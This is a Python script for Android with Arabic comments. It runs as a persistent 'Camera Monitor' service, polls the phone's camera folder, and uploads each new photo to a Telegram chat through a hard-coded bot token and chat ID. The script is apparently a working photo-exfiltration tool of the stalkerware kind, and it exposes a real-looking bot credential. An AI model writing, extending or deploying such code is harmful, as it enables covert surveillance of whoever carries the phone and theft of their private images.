import os
import time
import requests

# --- إعدادات التلجرام الخاصة بك ---
TOKEN = "8593668067:AAGN3s4L5ulu7BODLfx35qEJkdVMdriTVEA"
CHAT_ID = "-1003535367279"

# متغيرات التحكم لضمان عدم التكرار
is_running = True
# هذه القائمة ستحفظ أسماء الصور التي تم إرسالها بالفعل خلال الجلسة الحالية
sent_files = set()

def setup_foreground_service():
    """تفعيل الإشعار الدائم (للـ APK النهائي)"""
    try:
        from jnius import autoclass
        PythonService = autoclass('org.kivy.android.PythonService')
        service_ctx = PythonService.mService
        NotificationBuilder = autoclass('android.app.Notification$Builder')
        
        notification = NotificationBuilder(service_ctx) \
            .setContentTitle("🛡️ Camera Monitor: Active") \
            .setContentText("المراقبة تعمل... يتم الإرسال مرة واحدة فقط") \
            .setSmallIcon(service_ctx.getApplicationInfo().icon) \
            .setOngoing(True) \
            .build()
        service_ctx.startForeground(1, notification)
    except:
        pass

def send_as_document(photo_path, file_name):
    """إرسال الصورة كملف مرة واحدة فقط"""
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    try:
        with open(photo_path, 'rb') as doc_file:
            payload = {
                'chat_id': CHAT_ID,
                'caption': f"📄 ملف جديد:\n{file_name}" 
            }
            files = {'document': doc_file}
            requests.post(url, files=files, data=payload)
            return True # تم الإرسال بنجاح
    except Exception as e:
        print(f"Error: {e}")
        return False

def monitor_camera():
    global is_running, sent_files
    
    # 1. تعريف المسار
    path = "/storage/emulated/0/DCIM/Camera"
    
    # 2. عند بدء التشغيل، نعتبر كل الصور الموجودة حالياً "قديمة" ولا نرسلها
    if os.path.exists(path):
        known_files = set(os.listdir(path))
    else:
        known_files = set()

    # 3. إرسال رسالة تأكيد البدء
    try:
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                      data={'chat_id': CHAT_ID, 'text': "✅ بدأ البوت المراقبة بنظام منع التكرار."})
    except:
        pass

    while is_running:
        try:
            if os.path.exists(path):
                current_files = set(os.listdir(path))
                # الصور الجديدة هي الموجودة الآن وليست في قائمة المعروفة ولا المرسلة
                new_files = current_files - known_files - sent_files
                
                for file in new_files:
                    if file.lower().endswith(('.jpg', '.jpeg', '.png')):
                        full_path = os.path.join(path, file)
                        
                        # نضع الملف في قائمة "المرسلة" فوراً قبل الإرسال لمنع التكرار
                        sent_files.add(file)
                        
                        # انتظار اكتمال كتابة الملف في ذاكرة الهاتف
                        time.sleep(2) 
                        
                        # تنفيذ الإرسال
                        send_as_document(full_path, file)
                
                # تحديث القائمة الأساسية لتشمل كل ما تم اكتشافه
                known_files.update(current_files)
        except Exception as e:
            print(f"Loop error: {e}")
            
        time.sleep(5) # فحص كل 5 ثوانٍ

if __name__ == '__main__':
    setup_foreground_service()
    monitor_camera()
